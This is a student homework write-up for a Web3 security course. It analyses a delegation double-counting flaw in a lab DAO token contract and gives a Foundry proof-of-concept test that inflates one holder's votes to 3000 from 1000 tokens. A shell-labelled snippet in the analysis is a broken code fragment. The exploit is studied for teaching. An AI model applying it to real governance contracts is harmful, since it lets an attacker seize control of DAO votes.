# Web3-Security-Dev-Batch-1-HW W2

## Vulnerability Analysis

#### 1. Balance account for voting power

token balance should not account for voting power, can use `ERC20Votes.sol` for better checkpoints implementations, `ERC20Votes.sol` extension keeps a history (checkpoints) of each account's vote power, the downside is that it
requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked, and to keep in mind is that voting is usually handled by governance contracts.

ps: also it save more gas, can vote without spending gas, because the delegatee is using voting on their behalf

`ERC20Votes.sol` source : <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Votes.sol>

```sh
function _delegate uint256 _addrBalance = balanceOf(_addr);
```

#### 2. The votes getter function didn't check the availability of checkpoints

`getVotes` function doesn't check the availability of checkpoints. This means that vote powers can still remain transferable, even after member has delegated to another user and transferred tokens to other members

## POC

* Hacker control `alice` account to delegates vote power to himself, so he can create a proposal or vote on a proposal
* After delegation completed, transfer 1000 tokens to other dao member (bob, Carol), repeat the same process
* Control bob account to delegates more vote power to hacker himself, repeat the same process for Carol
* Finish all the delegations & transfer tokens to hacker himself
* Now hacker has 3000 vTokens and also 1000 vTokens

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "contracts/hack/governance/DaoToken.sol";

contract exploitTest is Test {
 DaoToken daoToken;
 address public owner = address(0);
 address public hacker =address(1337);

 address public alice= address(1);
 address public bob = address(2);
 address public carol = address(3);

 function setUp() public {
  vm.startPrank(owner);
  daoToken = new DaoToken();
  daoToken.mint(alice, 1000);
  vm.stopPrank();
  }

 function testExploit() public {
    vm.startPrank(alice);
    //hacker control alice account to delegates vote power to himself, so he can create a proposal or vote on a proposal
    daoToken.delegate(hacker);
    daoToken.getVotes(alice);
    //transfer 1000 tokens to other dao member (bob, Carol)
    daoToken.transfer(bob, 1000);
    vm.startPrank(bob);
    // control bob account to delegates more vote power to hacker himself, repeat the same process for Carol
    daoToken.delegate(hacker);
    daoToken.transfer(carol, 1000);

    vm.startPrank(carol);
    daoToken.delegate(hacker);


    // now hacker should has 3000 votes, hacker also wanna transfer 1000 tokens to himself
    daoToken.transfer(hacker, 1000);
    vm.stopPrank();

 uint hacker_vote = daoToken.getVotes(hacker);
    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

 uint hacker_balance= daoToken.balanceOf(hacker);
    console.log("Hacker's daoToken after the attack: %s: ", hacker_balance);

 assertEq(hacker_vote , 3000);
 assertEq(hacker_balance, 1000);
    }

}
```

## Group Assignments
